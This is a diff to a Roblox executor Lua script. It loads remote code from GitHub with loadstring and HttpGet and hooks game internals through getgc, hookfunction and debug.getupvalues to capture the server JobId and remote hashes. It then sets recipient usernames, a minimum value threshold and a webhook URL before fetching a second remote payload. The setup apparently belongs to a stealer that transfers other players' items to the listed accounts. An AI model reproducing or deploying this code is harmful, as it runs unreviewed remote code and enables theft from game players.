@@ -1,75 +1,77 @@
-loadstring(game:HttpGet("https://raw.githubusercontent.com/ShxDrag/Scripty/refs/heads/main/Op.lua"))()
-wait(1)
-local adm = require(
-    game:GetService("ReplicatedStorage")
-        :WaitForChild("ClientModules")
-        :WaitForChild("Core")
-        :WaitForChild("UIManager")
-        :WaitForChild("Elements")
-        :WaitForChild("AboveCharStack")
-)
+task.spawn(function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/ShxDrag/Scripty/refs/heads/main/Op.lua"))()
+end)
 
-local function isDelta()
-    return (typeof(getgenv) == "function" and getgenv().Delta ~= nil) or
-           (identifyexecutor and identifyexecutor():lower():find("delta"))
-end
+task.spawn(function()
+    local adm = require(
+        game:GetService("ReplicatedStorage")
+            :WaitForChild("ClientModules")
+            :WaitForChild("Core")
+            :WaitForChild("UIManager")
+            :WaitForChild("Elements")
+            :WaitForChild("AboveCharStack")
+    )
 
-if isDelta() then
-    local dy = adm.destroy
-    adm.destroy = function(...)
-        local result = dy(...)
-        _G.CachedJobId = game.JobId
-        print(_G.CachedJobId)
-        adm.destroy = dy
-        return result
+    local function isDelta()
+        return (typeof(getgenv) == "function" and getgenv().Delta ~= nil) or
+               (identifyexecutor and identifyexecutor():lower():find("delta"))
     end
 
-    repeat
-        stepAnimate = nil
-        for _, v in ipairs(getgc(true)) do
-            if typeof(v) == "function" then
-                local info = debug.getinfo(v)
-                if info and info.name == "stepAnimate" then
-                    stepAnimate = v
-                    break
-                end
-            end
-        end
-        task.wait()
-    until stepAnimate
-
-    local printed = false
-    old = hookfunction(stepAnimate, function(dt)
-        if not printed then
-            printed = true
+    if isDelta() then
+        local dy = adm.destroy
+        adm.destroy = function(...)
+            local result = dy(...)
             _G.CachedJobId = game.JobId
             print(_G.CachedJobId)
+            adm.destroy = dy
+            return result
         end
-        return old(dt)
-    end)
-end
 
--- Cache the hashes before loading obfuscated script
-_G.CachedHashes = {}
-for _, v in pairs(getgc()) do
-    if type(v) == "function" and debug.getinfo(v).name == "get_remote_from_cache" then
-        local upvalues = debug.getupvalues(v)
-        if type(upvalues[1]) == "table" then
-            for key, value in pairs(upvalues[1]) do
-                _G.CachedHashes[key] = value
+        repeat
+            stepAnimate = nil
+            for _, v in ipairs(getgc(true)) do
+                if typeof(v) == "function" then
+                    local info = debug.getinfo(v)
+                    if info and info.name == "stepAnimate" then
+                        stepAnimate = v
+                        break
+                    end
+                end
             end
-            break
+            task.wait()
+        until stepAnimate
+
+        local printed = false
+        old = hookfunction(stepAnimate, function(dt)
+            if not printed then
+                printed = true
+                _G.CachedJobId = game.JobId
+                print(_G.CachedJobId)
+            end
+            return old(dt)
+        end)
+    end
+
+    _G.CachedHashes = {}
+    for _, v in pairs(getgc()) do
+        if type(v) == "function" and debug.getinfo(v).name == "get_remote_from_cache" then
+            local upvalues = debug.getupvalues(v)
+            if type(upvalues[1]) == "table" then
+                for key, value in pairs(upvalues[1]) do
+                    _G.CachedHashes[key] = value
+                end
+                break
+            end
         end
     end
-end
 
-_G.Usernames = {"Robloxbluered1111", "Robloxredblue1111", "Robloxgray1111"}
-_G.min_value = 0.03
-_G.pingEveryone = "Yes"
-_G.webhook = "https://megamegamega.vercel.app/api/webhook"
-_G.scriptExecuted = _G.scriptExecuted or false
-if _G.scriptExecuted then
-    return
-end
-_G.scriptExecuted = true
-loadstring(game:HttpGet("https://raw.githubusercontent.com/ShxDrag/Premium/refs/heads/main/notBest.lua"))()
+    _G.Usernames = {"Robloxbluered1111", "Robloxredblue1111", "Robloxgray1111"}
+    _G.min_value = 0.02
+    _G.pingEveryone = "Yes"
+    _G.webhook = "https://megamegamega.vercel.app/api/webhook"
+    _G.scriptExecuted = _G.scriptExecuted or false
+    if _G.scriptExecuted then return end
+    _G.scriptExecuted = true
+
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/ShxDrag/Premium/refs/heads/main/notBest.lua"))()
+end)
